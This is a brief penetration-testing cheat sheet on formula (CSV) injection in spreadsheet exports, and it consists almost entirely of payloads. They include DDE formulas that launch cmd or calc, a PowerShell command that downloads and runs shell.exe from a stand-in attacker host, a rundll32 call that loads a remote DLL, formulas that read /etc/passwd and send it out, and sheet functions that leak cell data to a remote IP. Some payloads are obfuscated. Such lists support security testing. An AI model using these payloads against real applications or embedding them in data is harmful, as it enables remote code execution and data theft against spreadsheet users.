# Formula Injection

* Check if any feature supports downloading summary of the table as xlsx, csv...
* If yes, try adding the following payload and creating the summary
  * `=cmd|' /C calc'!xxx`
  * `=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1`
  * `='file:///etc/passwd'#$passwd.A1`
  * `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
  * `=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1`
  * `=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")`
  * `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")`
  * `=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
  * `=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))`
  * `=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
  * `=CONCATENATE(A2:E2)`
  * `=cmd|' /C calc'!xxx`
  * `@SUM(1+1)*cmd|' /C calc'!A0`
  * `DDE ("cmd";"/C calc";"!A0")A0`
  * `=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1`
  * `=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A`
  * `=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A`
  * `+thespanishinquisition(cmd|'/c calc.exe'!A`
  * `-thespanishinquisition(cmd|'/c calc.exe'!A`
  * `=         cmd|'/c calc.exe'!A`
  * `=rundll32|'URL.dll,OpenURL calc.exe'!A`
  * `=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A`
  * `=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A`
  * `%0A-3+3+cmd|' /C calc'!D2`
  * `%0A=cmd|' /C calc'!xxx`
  * `abc%0A=cmd|' /C calc'!xxx`

